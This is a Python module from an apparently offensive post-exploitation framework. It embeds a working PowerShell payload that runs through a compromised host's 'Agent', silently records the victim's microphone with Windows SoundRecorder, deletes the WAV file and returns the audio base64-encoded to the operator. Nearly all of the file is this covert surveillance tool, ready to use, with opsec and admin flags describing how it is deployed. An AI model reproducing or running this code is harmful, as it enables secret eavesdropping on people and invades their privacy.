from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Start-SoundRecorder',

            # list of one or more authors for the module
            'Author': ['@coffeetocode'],

            # more verbose multi-line description of the module
            'Description': ('This module uses the built in Windows SoundRecorder program to capture audio from the default recording device. '
                            'Records at 1411 kbps (default rate).'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : 'wav',

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'comment',
                'Based on WebcamRecorder module, but uses built-in SoundRecorder (easiest/dumbest way to do this).'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run the module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RecordTime' : {
                'Description'   :   'Length of time to record in seconds. Defaults to 5.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutPath' : {
                'Description'   :   'Temporary save path for the .wav file. Defaults to the current users APPDATA\\roaming directory',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        # the PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
function Start-SoundRecorder
{
  <#
  .SYNOPSIS
  Records audio using built-in SoundRecorder and default audio input device. 

  Author: Patrick Thomas (@coffeetocode)
  License: BSD 3-Clause

  .DESCRIPTION
  TODO. 

  .PARAMETER RecordTime
  Amount of time to record in seconds. Defaults to 5.

  .PARAMETER OutPath
  File path to save the recorded output. Defaults to the current users APPDATA directory. The output format is in WAV. 

  .EXAMPLE

  Start-SoundRecorder

  Record the webcam for 5 seconds and save the output to the current users APPDATA directory. 

  .EXAMPLE

  Start-SoundRecorder -RecordTime 90 -OutPath C:\audio.wav

  Record audio for 90 seconds and save the output to C:\audio.wav

  #>
  [CmdletBinding()]
  param
  (
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [int]$RecordTime,

    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [Alias("FilePath")]
    [string]$OutPath
  )
  
  #Set the output path to the users APPDATA directory if the OutPath variable 
  if (-not $PSBoundParameters['OutPath']) 
  {
    $OutPath = "$($env:APPDATA)\out.wav"    
  }

  if (-not $PSBoundParameters['RecordTime']) 
  {
    $RecordTime = 5
  }
  
  #Reformat seconds input to hh:mm:ss format expected by SoundRecorder
  $TS =  [timespan]::fromseconds($RecordTime)
  $RecordTimeFormatted = "{0:HH:mm:ss}" -f ([datetime]$ts.Ticks)  

  Write-Verbose "[+] Starting audio capture"
  $Process = "SoundRecorder"
  $ProcessArgs = "/FILE `"$OutPath`" /DURATION `"$RecordTimeFormatted`""
  Start-Process $Process -ArgumentList $ProcessArgs -Wait
  Write-Verbose "[+] Audio capture completed"

  $returnBytes = [System.IO.File]::ReadAllBytes($OutPath)
  Remove-Item $OutPath
  [System.Convert]::ToBase64String($returnBytes)

}
Start-SoundRecorder"""
       
        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
